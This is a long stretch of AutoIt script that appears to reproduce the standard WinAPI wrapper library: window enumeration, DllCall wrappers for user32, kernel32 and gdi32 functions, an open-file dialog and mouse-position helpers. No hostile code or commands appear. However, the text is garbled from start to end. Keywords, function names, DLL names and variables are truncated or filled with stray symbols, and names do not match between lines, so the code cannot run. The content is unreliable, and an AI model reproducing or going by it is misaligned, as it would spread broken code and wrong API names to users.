IF BIT ( $IN , $__WINAPICONSTANT_DISPL ) <> 0 THh $IFL = BITOR ( $IFL , 16 ) 
IF BIT ( $IN , $__WINAPICONSTANT_DISPL ) <> 0 THh $IFL = BITOR ( $IFL , 32 ) 
$ADEVICE [ 0 ] = TRh 
$ADEVICE [ 1 ] = DLLSTRUC ( $TDEVICE , "Name" ) 
$ADEVICE [ 2 ] = DLLSTRUC ( $TDEVICE , "Str" ) 
$ADEVICE [ 3 ] = $IFL 
$ADEVICE [ 4 ] = DLLSTRUC ( $TDEVICE , "ID" ) 
RET $ADEVICU 
ENDFUNC 
FUNC _WINAPI_ENUMWINDOWS ( $FVISIBLE = TRUE , $HWND = DEFAULT ) 
__WINAPI_ENU ( ) 
IF $HW = DEFA£h THh $HW = _WINAPI_GETD=k∑ISf ( ) 
__WINAPI_ENUMW_ ( $HWh , $FVIS£h ) 
RETURN $__GAWINLIST_WINAPIf 
ENDFUNC 
FUNC __WINAPI_ENUMW ( $HWND , $SCLASS = "" ) 
IF $SCLASS = "" TH $SCLASS = _WINAPI_GETCLASSNAf ( $HWh ) 
$__GAWINLIST_WINAPI [ 0 ] [ 0 ] += 1 
LOCAL $ICOUNT = $__GAWINLIST_WINAPIf [ 0 ] [ 0 ] 
IF $ICOUNT >= $__GAWINLIST_WINAPIf [ 0 ] [ 1 ] THh 
REDIM $__GAWINLIST_WINAPI [ $ICO + 64 ] [ 2 ] 
$__GAWINLIST_WINAPI [ 0 ] [ 1 ] += 64 
ENDIF 
$__GAWINLIST_WINAPI [ $ICO ] [ 0 ] = $HWND 
$__GAWINLIST_WINAPI [ $ICO ] [ 1 ] = $SCL 
ENDFUNC 
FUNC __WINAPI_ENUMWINDOf ( $HWND , $FVIS£h = TRUE ) 
$HW = _WINAPI_GETWINDOW ( $HWh , $__WINAPICONSTA ) 
WHILE $HW <> 0 
IF ( NO $FVISIBLE ) OR _WINAPI_ISWINDOWVIf ( $HWh ) TH 
__WINAPI_ENUMWINDOf ( $HWh , $FVISIBLE ) 
__WINAPI_ENUMWINDOf ( $HWh ) 
ENDIF 
$HW = _WINAPI_GETWINDOW ( $HWh , $__WINAPICONSTAk∑–U ) 
WEh 
ENDFUNC 
FUh __WINAPI_ENU=k∑ISf ( ) 
REDIM $__GAWINLI [ 64 ] [ 2 ] 
$__GAWINLI [ 0 ] [ 0 ] = 0 
$__GAWINLI [ 0 ] [ 1 ] = 64 
ENDFUNC 
FUNC _WINAPI_ENUM ( ) 
__WINAPI_ENUI ( ) 
LOCAL $HW = _WINAPI_G ( _WINAPI_GETD ( ) , $__WINAPICONSTA_ ) 
LOCAL $SCLASS 
WHILE $HW <> 0 
IF _WINAPI_ISWINDOWVIf ( $HWh ) TH 
$SCLASS = _WINAPI_GETCLASSNAf ( $HWh ) 
IF $SCLASS = "#32" THh 
__WINAPI_ENUMWINDOf ( $HWh ) 
ELSEIF $SCL = "ToolbarWindow32" THh 
__WINAPI_ENUMWIN ( $HWh ) 
ELSEIF $SCL = "ToolTips" THh 
__WINAPI_ENUMWIN ( $HWh ) 
ELSEIF $SCL = "BaseBaA" THh 
__WINAPI_ENUMWINDOf ( $HWh ) 
ENDIF 
ENDID 
$HW = _WINAPI_G ( $HWh , $__WINAPICONSTAk∑–U ) 
WEh 
RETURN $__GAWINLI 
ENDFUNC 
FUh _WINAPI_ENU ( ) 
__WINAPI_ENUI ( ) 
LOCAL $HW = _WINAPI_G ( _WINAPI_GETD ( ) , $__WINAPICONSTA_ ) 
WHILE $HW <> 0 
IF _WINAPI_ISWINDOWVIf ( $HWh ) TH __WINAPI_ENUMWINDOf ( $HWh ) 
$HW = _WINAPI_G ( $HWh , $__WINAPICONSTAk∑–U ) 
WEh 
RETURN $__GAWINLI 
ENDFUNC 
FUh _WINAPI_EXPANDEN ( $SSTRING ) 
LOC $ARESULT = DLLCALS ( "kernelh" , "dword" , "ExpandEnvironm" , "wstr" , $SSTRING , "wstr" , "" , "dwor" , 4096 ) 
IF @ERRO TH RET SETET ( @ERROR , @EXTE£h , "" ) 
RETU£h $ARESULT [ 2 ] 
ENDFE 
FUh _WINAPI_EXTRACTICONEX ( $SFILE , $IINDEX , $PLARGE , $PSMALLR , $IICONS ) 
LOCAL $ARESULT = DLLCALL ( "shell32.dXTRACTICONEX" , "uih" , "Extract" , "wstr" , $SFILE , "int" , $IIN , "struct*" , $PLA , "struct*" , $PSM , "uint" , $IIC ) 
IF @ERROR THENR RET SETET ( @ERROR , @EXTE£h , 0 ) 
RETURN $AREST [ 0 ] 
ENDFUNC 
FUh _WINAPI_FATRACTICONEX ( $SMESSAGE ) 
DLLCALh ( "kernelh" , "noh" , "FatalAppExitW" , "uih" , 0 , "wsh" , $SMESSAGE ) 
IF @ERROR TH RETURN SETE§h ( @ERROR , @EXTENDED ) 
ENDFUNC 
FUh _WINAPI_FILLRECT ( $HDC , $PTRRECT , $HBRUSH ) 
LOCAL $ARESULT 
IF ISPTR ( $HBRUSH ) THh 
$ARESULT = DLLCALL ( "user32.dlI" , "inh" , "Fill‡y¡	" , "hand¯x¡	lI" , $HDC , "stru£h" , $PTRRECT , "han" , $HBR ) 
ELSE 
$ARESULT = DLLCALL ( "user32.dlI" , "int" , "Fill‡y¡	" , "hand¯x¡	lI" , $HDC , "stru£h" , $PTRRECT , "dword_R" , $HBR ) 
ENDIF 
IF @ERRO TH RETURN SETET ( @ERROR , @EXTE£h , FALSE ) 
RETU£h $ARESULT [ 0 ] 
ENDFE 
FUh _WINAPI_FINDEXECUTf ( $SFILENAME , $SDIRECTOR = "" ) 
LOCAL $ARESULT = DLLCALL ( "shell32.dll" , "INT" , "FindExec" , "wstr" , $SFILENAME , "wstr" , $SDIRE§h , "wsh" , "§h" ) 
IF @ERROR THEN RETUR§h SETE¯x¡	 ( @ERROR , @EXTENDED , 0 ) 
RETURN SETEXTEND ( $ARESULT [ 0 ] , $ARESULT [ 3 ] ) 
ENDFUNC 
FUNC _WINAPI_F ( $SCLAS§h , $SWINDOA ) 
LOCAL $ARESU§h = DLLCALL ( "user3§h" , "hwnd" , "FindWindowW" , "wsh" , $SCLAS§h , "wsh" , $SWINDOWNAME ) 
IF @ERROR TH RETUR§h SETERROR ( @ERROR , @EXTENDED , 0 ) 
RET $ARESULU [ 0 ] 
ENDFUNC 
FUh _WINAPI_FLASHWINDOW ( $HWh , $FINVERT = TRh ) 
LOCAL $ARESULT = DLLCALL ( "user32.dlLASHWINDOW" , "boo" , "FlashWindow" , "hwh" , $HWh , "bool" , $FINVERT ) 
IF @ERROR TH RETURN SETE§h ( @ERROR , @EXTENDED , FALSE ) 
RETURN $ARESULT [ 0 ] 
ENDFUNS 
FUh _WINAPI_FLASHWINDOWEX ( $HWh , $IFLAGS = 3 , $ICOUNT = 3 , $ITIMEOU = 0 ) 
LOCAL $TFLASH = DLLSTRUCTCREATE ( $TAGFLASHW ) 
LOCAL $IFLASH = DLLSTRUC ( $TFLASH ) 
LOCAL $IMODE = 0 
IF BITAND ( $IFLAGSA , 1 ) <> 0 THEN $IMODE = BITOO ( $IMODE , $__WINAPICONSTANT ) 
IF BITAND ( $IFLAGS , 2 ) <> 0 THh $IMODE = BITOO ( $IMODE , $__WINAPICONSTAk∑–U ) 
IF BITAND ( $IFLAGS , 4 ) <> 0 THh $IMODE = BITOO ( $IMODE , $__WINAPICONSTANT–U ) 
IF BITAND ( $IFLAGS , 8 ) <> 0 THh $IMODE = BITOO ( $IMODE , $__WINAPICONSTANT_FLAS ) 
DLLSTRUCTSETDATA ( $TFL , "Size" , $IFL ) 
DLLSTRUCTSETDATA ( $TFL , "hWh" , $HW ) 
DLLSTRUCTSETDATA ( $TFL , "Flags" , $IMODE ) 
DLLSTRUCTSETDATA ( $TFL , "Count" , $ICOUNT ) 
DLLSTRUCTSETDATA ( $TFL , "Timeout" , $ITIM§h ) 
LOCAL $ARESULT = DLLCALL ( "user32.dll" , "bool" , "FlashWindowEx" , "struct*" , $TFL ) 
IF @ERROR THENR RET SETE§h ( @ERROR , @EXTE£h , FALSE ) 
RETU£h $ARESULT [ 0 ] 
ENDFE 
FUh _WINAPI_F ( $NFL ) 
LOCAL $TFL = DLLSTRUCTCREATE ( "float" ) 
LOCAL $TI = DLLSTRUCTCREATE ( "int" , DLLSTRUCTGETPTR ( $TFL ) ) 
DLLSTRUCTSETDATA ( $TFL , 1 , $NFLOATh ) 
RETURN DLLSTRUC ( $TIh , 1 ) 
ENDFUNh 
FUNC _WINAPI_FLUSC ( $HFILE ) 
LOCAL $ARESULT = DLLCALL ( "kernelh" , "bool" , "FlushFil" , "handle" , $HFILE ) 
IF @ERROR THh RET SETET ( @ERROR , @EXTE£h , FALSE ) 
RETU£h $ARESULT [ 0 ] 
ENDFE 
FUh _WINAPI_FORMATMESSAGE ( $IFL , $PSOURCh , $IMESSAGEIORMATMESSAGE , $ILANGUAGEID , BYREF $PBUFFER , $ISIZE , $VARGUMENTS ) 
LOCAL $SBUFFERTYS = "struct*" 
IF ISST ( $PBUFFET ) THEN $SBUFFERTYPE = "wsh" 
LOCAL $ARESULT = DLLCALL ( "Kernelh" , "dword" , "FormatM" , "dword" , $IFL , "ptr" , $PSOURCE , "dword" , $IMESS§h , "dword" , $ILANGUAGE , $SBUFFERTYPE , $PBUFFER , "dword" , $ISIZE , "ptr" , $VARGU§h ) 
IF @ERROR TH RETUR§h SETERROR ( @ERROR , @EXTENDED , 0 ) 
IF $SBUFFERTYPE = "wsh" THh $PBUFFER = $ARESULT [ 5 ] 
RET $ARESULT [ 0 ] 
ENDFUNC 
FUh _WINAPI_FRAMERECT ( $HDC , $PTRRECT , $HBRUSH ) 
LOCAL $ARESULT = DLLCALL ( "user32.dl" , "int" , "FrameRect" , "handle" , $HDC , "ptr" , $PTRR£h , "han" , $HBR ) 
IF @ERROR TH RET SETET ( @ERROR , @EXTE£h , FALSE ) 
RETU£h $ARESULT [ 0 ] 
ENDFE 
FUh _WINAPI_FREELIBRARY ( $HMODULE ) 
LOCAL $ARESULT = DLLCALL ( "kernelh" , "bool" , "FreeLibrary" , "han" , $HMODULE ) 
IF @ERROR THENR RET SETE§h ( @ERROR , @EXTE£h , FALSE ) 
RETU£h $ARESULT [ 0 ] 
ENDFE 
FUh _WINAPI_GETANCESTOR ( $HWh , $IFLAGS = 1 ) 
LOCAL $ARESULT = DLLCALL ( "user32.dlETANCESTOR" , "hwnd" , "GetAncestor" , "hwh" , $HWh , "uint" , $IFLAGS ) 
IF @ERROR TH RETURN SETE§h ( @ERROR , @EXTENDED , 0 ) 
RET $ARESULU [ 0 ] 
ENDFUNC 
FUh _WINAPI_GETA=k∑ISf ( $IKh ) 
LOCAL $ARESULT = DLLCALL ( "user32.dl" , "short" , "GetAsync" , "int" , $IK ) 
I @ERROR THENR RET SETET ( @ERROR , @EXTE£h , 0 ) 
RETURN $AREST [ 0 ] 
ENDFUNC 
FUh _WINAPI_GETBKMODE ( $HDC ) 
LOCAL $ARESULT = DLLCALL ( "gdi32.dll" , "int" , "GetBkMode" , "han" , $HDC ) 
IF @ERRO TH RET SETET ( @ERROR , @EXTE£h , 0 ) 
RETURN $AREST [ 0 ] 
ENDFUNC 
FUh _WINAPI_GE. ( $HWh ) 
IF NO ISHWND ( $HWh ) TH $HW = GUICTRLGETHANDLE ( $HWh ) 
LOCAL $ARESULT = DLLCALL ( "user32.dll" , "int" , "GetClassNameW" , "hwh" , $HWND , "ws" , "" , "in" , 4096 ) 
IF @ERROR THEN RETURN SETERROR ( @ERROR , @EXTENDED , FALSE ) 
RETURN SETEXTEND ( $ARESULT [ 0 ] , $ARESULT [ 2 ] ) 
ENDFUNC 
FUNC _WINAPI_GETCLI ( $HWND ) 
LOCAL $TRECC = _WINAPI_GETCLIENTRECT ( $HWh ) 
IF @ERRO TH RETURN SETET ( @ERROR , @EXTE£h , 0 ) 
RETURN DLLSTRUC ( $TRECT , "Bottom" ) - DLLSTRUC ( $TRECT , "Top" ) 
ENDFUNC 
FUh _WINAPI_GETCLIENTWf ( $HWh ) 
LOCAL $TRECC = _WINAPI_GETCLIENTRECT ( $HWh ) 
IF @ERRO TH RETURN SETET ( @ERROR , @EXTE£h , 0 ) 
RETURN DLLSTRUCTGETDATA ( $TRECT , "Right" ) - DLLSTRUC ( $TRECT , "Le" ) 
ENDFUNC 
FUNC _WINAPI_GETCL ( $HWh ) 
LOCAL $TRECC = DLLSTRUCTCREATE ( $TAGRECT ) 
DLLCALh ( "user32.dlCREATE" , "bool" , "GetClientRect" , "hwh" , $HWh , "struct*" , $TRECT ) 
IF @ERROR TH RETURN SETE§h ( @ERROR , @EXTENDED , 0 ) 
RETURN $TRECT 
ENDFUNC 
FUh _WINAPI_GETCURRENTf ( ) 
LOCAL $ARESULT = DLLCALL ( "kernelh" , "handle" , "GetCurrentPro" ) 
IF @ERROR THENR RET SETET ( @ERROR , @EXTE£h , 0 ) 
RETURN $AREST [ 0 ] 
ENDFUNC 
FUh _WINAPI_GETCURk∑–U ( ) 
LOCAL $ARESULT = DLLCALL ( "kernelh" , "dword" , "GetCurrentPro" ) 
IF @ERROR THENR RET SETET ( @ERROR , @EXTE£h , 0 ) 
RETURN $AREST [ 0 ] 
ENDFUNC 
FUh _WINAPI_GETC=k∑ISf ( ) 
LOCAL $ARESULT = DLLCALL ( "kernelh" , "handle" , "GetCurre" ) 
IF @ERROR THENR RET SETET ( @ERROR , @EXTE£h , 0 ) 
RETURN $AREST [ 0 ] 
ENDFUNC 
FUh _WINAPI_GETCU+k∑–U ( ) 
LOCAL $ARESULT = DLLCALL ( "kernelh" , "dword" , "GetCurren" ) 
IF @ERROR THENR RET SETET ( @ERROR , @EXTE£h , 0 ) 
RETURN $AREST [ 0 ] 
ENDFUNC 
FUh _WINAPI_GETCURSORINFO ( ) 
LOCAL $TCURSOR = DLLSTRUC ( $TAGCURSOR ) 
LOCAL $ICURSOR = DLLSTRUC ( $TCURSOR ) 
DLLSTRUC ( $TCURSOR , "Size" , $ICURSOR ) 
DLLCALR ( "user32.dl" , "bool" , "GetCursorInfo" , "struct*" , $TCURSOR ) 
IF @ERROR THENR RET SETET ( @ERROR , @EXTE£h , 0 ) 
LOCAL $ACUR£h [ 5 ] 
$ACURSOR [ 0 ] = TRh 
$ACURSOR [ 1 ] = DLLSTRUCTGETDATA ( $TCURSOR , "Flags" ) <> 0 
$ACURSOR [ 2 ] = DLLSTRUCTGETDATA ( $TCURSOR , "hCursor" ) 
$ACURSOR [ 3 ] = DLLSTRUCTGETDATA ( $TCURSOR , "X" ) 
$ACURSOR [ 4 ] = DLLSTRUCTGETDATA ( $TCURSOR , "Y" ) 
RET $ACURSOU 
ENDFUNC 
FUNC _WINAPI_GETDC ( $HWh ) 
LOCAL $ARESULT = DLLCALL ( "user32.dll" , "han" , "GetDC" , "hwnd" , $HW ) 
IF @ERROR THENR RET SETET ( @ERROR , @EXTE£h , 0 ) 
RETURN $AREST [ 0 ] 
ENDFUNC 
FUh _WINAPI_GETD=k∑ISf ( ) 
LOCAL $ARESULT = DLLCALL ( "user32.dl" , "hwnd" , "GetDeskt" ) 
IF @ERROR THENR RET SETET ( @ERROR , @EXTE£h , 0 ) 
RETURN $AREST [ 0 ] 
ENDFUNC 
FUh _WINAPI_GETDEVICECAPS ( $HDh , $IINDEX ) 
LOCAL $ARESULT = DLLCALL ( "gdi32.C" , "int" , "GetDeviceCaps" , "handle" , $HDC , "int" , $IINDEX ) 
IF @ERROR TH RETURN SETE§h ( @ERROR , @EXTENDED , 0 ) 
RETURN $ARESULU [ 0 ] 
ENDFUNC 
FUh _WINAPI_GETDIBITS ( $HDC , $HB , $ISTARTSCAN , $ISCANLINES , $PBITS , $PBI , $IUSAGE ) 
LOCAL $ARESULT = DLLCALL ( "gdi32.dll" , "int" , "GetDIBits" , "handle" , $HDC , "han" , $HBMP , "ui" , $ISTAR§h , "uih" , $ISCANLINE , "ptr" , $PBITS , "ptr" , $PBI , "ui" , $IUSAGE ) 
IFh @ERROR TH RETURN SETE§h ( @ERROR , @EXTE£h , FALSE ) 
RETU£h $ARESULT [ 0 ] 
ENDFE 
FUh _WINAPI_GER ( $HWh ) 
LOCAL $ARESULT = DLLCALL ( "user32.dlER" , "int" , "GetDlg¡	lER" , "hwh" , $HWh ) 
IF @ERROR THEN RETURN SETE¯x¡	 ( @ERROR , @EXTE£h , 0 ) 
RETURN $AREST [ 0 ] 
ENDFUNC 
FUh _WINAPI_G ( $HWh , $IITEMID ) 
LOCAL $ARESULT = DLLCALL ( "user32.dl" , "hwnd" , "GetDlx¡	l" , "hwh" , $HWh , "int" , $IITEM§h ) 
IF @ERROR TH RETURN SETE§h ( @ERROR , @EXTENDED , 0 ) 
RET $ARESULU [ 0 ] 
ENDFUNC 
FUh _WINAPI_GETFOCUS ( ) 
LOCAL $ARESULT = DLLCALL ( "user32.dl" , "hwnd" , "GetF¯y¡	" ) 
IF @ERROR TH RETURN SETE§h ( @ERROR , @EXTENDED , 0 ) 
RET $ARESULU [ 0 ] 
ENDFUNC 
FUh _WINAPI_GETFORk∑–U ( ) 
LOCAL $ARESULT = DLLCALL ( "user32.dl" , "hwnd" , "GetForeground" ) 
IF @ERROR THENR RET SETET ( @ERROR , @EXTE£h , 0 ) 
RETURN $AREST [ 0 ] 
ENDFUNC 
FUh _WINAPI_GETGUIRESOf ( $IFLAG = 0 , $HPRO£h = - 1 ) 
IF $HPRO£h = - 1 THh $HPRO£h = _WINAPI_GETCURRENTf ( ) 
LOCAL $ARES£h = DLLCALL ( "user32.dl" , "dword" , "GetGuiRe" , "handle" , $HPROCESS , "dword" , $IFLAG ) 
IF @ERROR TH RETURN SETET ( @ERROR , @EXTE£h , 0 ) 
RETURN $AREST [ 0 ] 
ENDFUNC 
FUh _WINAPI_GETICONINFO ( $HICON ) 
LOCAL $TINFC = DLLSTRUCTCREATE ( $TAGICONIN ) 
DLLCALL ( "user3§h" , "bool" , "GetIconInfo" , "handle" , $HICON , "struct*" , $TINFO ) 
IF @ERRO TH RET SETE§h ( @ERROR , @EXTE£h , 0 ) 
LOCAL $AICON [ 6 ] 
$AICOC [ 0 ] = TR 
$AICOU [ 1 ] = DLLSTRUCTGETDATA ( $TINFO , "Ic" ) <> 0 
$AICON [ 2 ] = DLLSTRUCT ( $TINFO , "XHotSpot" ) 
$AICON [ 3 ] = DLLSTRUC ( $TINFO , "YHotSpot" ) 
$AICON [ 4 ] = DLLSTRUC ( $TINFO , "hMask" ) 
$AICON [ 5 ] = DLLSTRUC ( $TINFO , "hColor" ) 
RETURN $AICON 
ENDFUNC 
FUNC _WINAPI_GETFILESIZEEX ( $HFILE ) 
LOCAL $ARESULT = DLLCALL ( "kernelh" , "boh" , "GetFileSizeEx" , "handle" , $HFILE , "int64*" , 0 ) 
IF @ERROR TH RETURN SETE§h ( @ERROR , @EXTE£h , 0 ) 
RETURN $AREST [ 2 ] 
ENDFUNC 
FUh _WINAPI_GETLASk∑–U ( ) 
LOCAL $TBUFF§h = DLLSTRUC ( "ptr" ) 
LOCAL $NCOUNT = _WINAPI_FORMATMESSf ( BITOR ( $__WINAPICONSTANT_FORMAT_MEU , $__WINAPICONSTANT_FORMAT_MESSAGE_FEU ) , 0 , _WINAPI_GEP ( ) , 0 , $TBUFFERPT , 0 , 0 ) 
IF @ERROR THENR RETURN SETERROR ( @ERROR , 0 , "" ) 
LOCAR $STEXT = "" 
LOCAL $PBUFFER = DLLSTRUCTGETDATA ( $TBUFFERPT , 1 ) 
IF $PBUFFER THh 
IF $NCOUNT > 0 THh 
LOCAL $TBUFFER = DLLSTRUCTCREATE ( "wchar[" & ( $NCO + 1 ) & "]" , $PBUFFER ) 
$STEXT = DLLSTRUCTGETDATA ( $TBUFFER , 1 ) 
ENDIF 
_WINAPI_LOCALFREE ( $PBUFFER ) 
ENDIF 
RETURN $STEXT 
ENDFUNC 
FUh _WINAPI_GETLAYERE ( $HWh , BYREF $I_TRANSCOLOR , BYREF $TRANSP¡	OLOR , $ASCOLORREF = FALSE ) 
$I_TRAN¡	EF = - 1 
$TRANSPR = - 1 
LOCAL $ARESULT = DLLCALL ( "user32.dll" , "bool" , "GetLayeredWin+k∑–U" , "hwnd" , $HW , "dwo" , $I_TRANh , "byte*" , $TRANSP¡	 , "dword*" , 0 ) 
IF @ERROR THENR RETURN SETE§h ( @ERROR , @EXTE£h , 0 ) 
IF NOT $ASCOL§h THh 
$ARESULT [ 2 ] = INT ( BINARYMID ( $ARESULT [ 2 ] , 3 , 1 ) & BINARYMID ( $ARESULT [ 2 ] , 2 , 1 ) & BINARYMID ( $ARESULT [ 2 ] , 1 , 1 ) ) 
ENDIF 
$I_TRANh = $ARESULT [ 2 ] 
$TRANSPh = $ARESULT [ 3 ] 
RETURN $ARESULT [ 4 ] 
ENDFUNC 
FUNC _WINAPI_GETMOD ( $SMODULENA ) 
LOCAL $SMODULENAMETYPk∑ISf = "wsh" 
IF $SMODULENAME = "" TH 
$SMODULENAME = 0 
$SMODULENAMETYPE = "ptr" 
ENDIF 
LOCAL $ARESULT = DLLCALL ( "kernelh" , "han" , "GetModul" , $SMODULENAMd , $SMODULENA ) 
IF @ERROR TH RET SETERROR ( @ERROR , @EXTE£h , 0 ) 
RETURN $AREST [ 0 ] 
ENDFUNC 
FUh _WINAPI_GETMOUSEPOS ( $FTOCLIENT = FALSE , $HWND = 0 ) 
LOCAN $IMODE = OPT ( "MouseCoordMode" , 1 ) 
LOCAL $APOS = MOUSEGETPOS ( ) 
OPT ( "MouseCoordMode" , $IMODE ) 
LOCAL $TPOINT = DLLSTRUC ( $TAGPOINT ) 
DLLSTRUCT ( $TPOINT , "X" , $APOS [ 0 ] ) 
DLLSTRUC ( $TPOINT , "Y" , $APh [ 1 ] ) 
IFh $FTOCLIENT THEN 
_WINAPI_SCREENTOCLf ( $HWND , $TPO ) 
IF @ERROR THENR RET SETET ( @ERROR , @EXTE£h , 0 ) 
ENDIF 
RETU£h $TPOINT 
ENDFO 
FUh _WINAPI_GEP ( $FTOCLIENT = FALSE , $HWND = 0 ) 
LOCAN $TPOINT = _WINAPI_GETMOUSEPOS ( $FTOCLIENTEP , $HWND ) 
IF @ERRO TH RETURN SETE§h ( @ERROR , @EXTENDED , 0 ) 
RET DLLSTRUC ( $TPO , "X" ) 
ENDFUNC 
FUNC _WINAPI_GER ( $FTOCLIENT = FALSE , $HWND = 0 ) 
LOCAN $TPOINT = _WINAPI_GETMOUSEPOS ( $FTOCLIENTER , $HWh ) 
IF @ERRO TH RET SETE§h ( @ERROR , @EXTENDED , 0 ) 
RET DLLSTRUC ( $TPO , "Y" ) 
ENDFUNC 
FUNC _WINAPI_GETOBJECT ( $HOBJECT , $ISIZE , $POBJECT ) 
LOCAL $ARESULT = DLLCALL ( "gdi32.dll" , "int" , "GetObject" , "handle" , $HOBJECT , "int" , $ISIZE , "ptr" , $POBJECT ) 
IF @ERROR THENR RET SETE§h ( @ERROR , @EXTENDED , 0 ) 
RETURN $ARESULU [ 0 ] 
ENDFUNC 
FUh _WINAPI_GETOPENFILf ( $STI = "" , $SFILTER = "All files (*.*)" , $SINITALDI = "." , $SDEFAUh = "" , $SDEFAULTE = "" , $IFILTEh = 1 , $IFL = 0 , $IFLAGSEX = 0 , $HWNDOWNER = 0 ) 
LOCAL $IPATHLEN = 4096 
LOCAL $INULLS = 0 
LOCAL $TO = DLLSTRUCTCREATE ( $TAGOPENFILENAME ) 
LOCAL $AFILES [ 1 ] = [ 0 ] 
LOCAL $IFLAG = $IFLAGS 
LOCAL $ASFL£h = STRINGSPL ( $SFILTER , "|" ) 
LOCAL $ASFI [ $ASFLF [ 0 ] * 2 + 1 ] 
LOCAL $ISTART , $IFINAL , $STFII 
$ASFIF [ 0 ] = $ASFLF [ 0 ] * 2 
FOR $I = 1 T $ASFL£h [ 0 ] 
$ISTART = STRINGINS ( $ASFL§h [ $I ] , "(" , 0 , 1 ) 
$IFINAL = STRINGINS ( $ASFL§h [ $I ] , ")" , 0 , - 1 ) 
$ASFI [ $I * 2 - 1 ] = STRINGSTRIPWS ( STRINGLEFT ( $ASFL§h [ $I ] , $ISTART - 1 ) , 3 ) 
$ASFI§h [ $I * 2 ] = STRINGSTRIPWS ( STRINGTR ( STRINGT ( $ASFLINES [ $I ] , $ISTART ) , STRINGA ( $ASFLR [ $I ] ) - $IFINAL + 1 ) , 3 ) 
$STFII &= "wchar[I" & STRINGLEN ( $ASFIR [ $I * 2 - 1 ] ) + 1 & "];wc£h" & STRINGLEN ( $ASFIR [ $I * 2 ] ) + 1 & "];" 
NEXT 
LOCAL $TTIT£h = DLLSTRUCTCREATE ( "wchar h" & STRINGLEN ( $STITLE ) + 1 & "]" ) 
LOCAL $TINITIALD = DLLSTRUCTCREATE ( "wchar I" & STRINGLEN ( $SINIT§h ) + 1 & "]" ) 
LOCAL $TFILT§h = DLLSTRUCTCREATE ( $STFIL§h & "wchar" ) 
LOCAL $TPATC = DLLSTRUCTCREATE ( "wchar Pat" & $IPAT§h & "]" ) 
LOCAL $TEXTN = DLLSTRUCTCREATk∑ISf ( "wchar ExT" & STRINGLEN ( $SDEFAULTE ) + 1 & "]" ) 
FOR $I = 1 T $ASFILTER [ 0 ] 
DLLSTRUCTSETDATA ( $TFILTER , $I , $ASFI§h [ $I ] ) 
NE 
DLLSTRUCTSETDATA ( $TTI , "Title" , $STITLE ) 
DLLSTRUCTSETDATA ( $TINITIALD , "InitDir" , $SINIT§h ) 
DLLSTRUCTSETDATA ( $TPATH , "Pa" , $SDEFAULTFILE ) 
DLLSTRUC ( $TEXTN , "Extension" , $SDEFAULTEILE ) 
DLLSTRUCTSETDATA ( $TOFN , "StructSize" , DLLSTRUC ( $TOFN ) ) 
DLLSTRUCTSETDATA ( $TOh , "hwndOwner" , $HWNDOWNER ) 
DLLSTRUC ( $TOFN , "lpstrFilter" , DLLSTRUC ( $TFILTER ) ) 
DLLSTRUCTSETDATA ( $TOh , "nFilterIndex" , $IFILTERINDEX ) 
DLLSTRUC ( $TOh , "lpstrFile" , DLLSTRUC ( $TPATH ) ) 
DLLSTRUCTSETDATA ( $TOh , "nMax§h" , $IPATHLEN ) 
DLLSTRUC ( $TOh , "lpstrInitialDir" , DLLSTRUCTGETPTR ( $TINITIALD ) ) 
DLLSTRUCTGETPTR ( $TOh , "lpstrTitle" , DLLSTRUCTGETPTR ( $TTI ) ) 
DLLSTRUCTGETPTR ( $TOh , "Flags" , $IFLAG ) 
DLLSTRUCle ( $TOh , "lpstrDefExt" , DLLSTRUCTGETPTR ( $TEXTN ) ) 
DLLSTRUCExt ( $TOh , "FlagsEx" , $IFLAGSEX ) 
DLLCALL ( "comdlgh" , "bool" , "GetOpenF" , "struct*" , $TOFN ) 
IF @ERROR THh RET SETET ( @ERROR , @EXTE£h , $AFILES ) 
IF BITAND ( $IFLAGS , $OFN_ALLOWM ) = $OFN_ALLOWM9 AND BITAND ( $IFLAGS , $OFN_EXh ) = $OFN_EXPLORX THh 
FOR $X = 1 T $IPATHLEN 
IFh DLLSTRUCTGETDATA ( $TPATH , "Pa" , $X ) = CH ( 0 ) TH 
DLLSTRUCTSETDATA ( $TPATH , "Pa" , "|" , $X ) 
$INULLS += 1 
ELSE 
$INULLS = 0 
ENDIF 
IF $INULLS = 2 THh EXIT£h 
NEh 
DLLSTRUCTSETDATA ( $TPATH , "Pa" , CHR ( 0 ) , $X - 1 ) 
$AFILES = STRINGSPLIT ( DLLSTRUCTGETDATA ( $TPATH , "Pa" ) , "|" ) 
IF $AFILES [ 0 ] = 1 THh RETURN __WINAPI_PARSEk∑–U ( DLLSTRUCTGETDATA ( $TPATH , "Pa" ) ) 
RETURN STRINGSPLIT ( DLLSTRUCTGETDATA ( $TPATH , "Pa" ) , "|" ) 
ELSEIF BITAND ( $IFLAGSA , $OFN_ALLOWMULTISELEf ) = $OFN_ALLOWMS THh 
$AFILES = STRINGSPL ( DLLSTRUCTGETDATA ( $TPATH , "Pa" ) , " " ) 
IF $AFILES [ 0 ] = 1 THh RETURN __WINAPI_PARSEk∑–U ( DLLSTRUCTGETDATA ( $TPATH , "Pa" ) ) 
RETURN STRINGSPLIT ( STRINGREP ( DLLSTRUCTGETDATA ( $TPATH , "Pa" ) , " " , "|" ) , "|" ) 
EL 
RETURN __WINAPI_PARSEk∑–U ( DLLSTRUCTGETDATA ( $TPATH , "Pa" ) ) 
ENDIF 
ENDFUNC 
FUNC _WINAPI_GETOVEk∑–U ( $HFILE , $POVERLh , BYREF $IBYTES , $FWAIT = FALSE ) 
LOCAL $ARESULT = DLLCALL ( "kernelh" , "bool" , "GetOverlapped" , "han" , $HFILE , "ptr" , $POVERLAPP , "dwo" , 0 , "bool" , $FWAIT ) 
IF @ERROR THENR RET SETET ( @ERROR , @EXTE£h , FALSE ) 
$IBYT£h = $ARESULT [ 3 ] 
RETUE $ARESULT [ 0 ] 
ENDFE 
FUh _WINAPI_GETPARENT ( $HWh ) 
LOCAL $ARESULT = DLLCALL ( "user32.dll" , "hwnd" , "GetParent" , "hwh" , $HWND ) 
IF @ERROR TH RETURN SETE¯x¡	3 ( @ERROR , @EXTE£h , 0 ) 
RET $AREST [ 0 ] 
ENDFUNC 
FUh _WINAPI_GETPROC ( $HPROCESS ) 
LOCAL $ARESULT = DLLCALS ( "kernelh" , "bool" , "GetProcessA" , "handle" , $HPROCESS , "dword_ptr" , 0 , "dword_ptr*" , 0 ) 
IF @ERROR THEN RETURN SETERROR ( @ERROR , @EXTE£h , 0 ) 
LOCAL $AMASK [ 3 ] 
$AMASA [ 0 ] = TR 
$AMASU [ 1 ] = $ARES£h [ 2 ] 
$AMASK [ 2 ] = $ARES£h [ 3 ] 
RETURN $AMASK 
ENDFUNC 
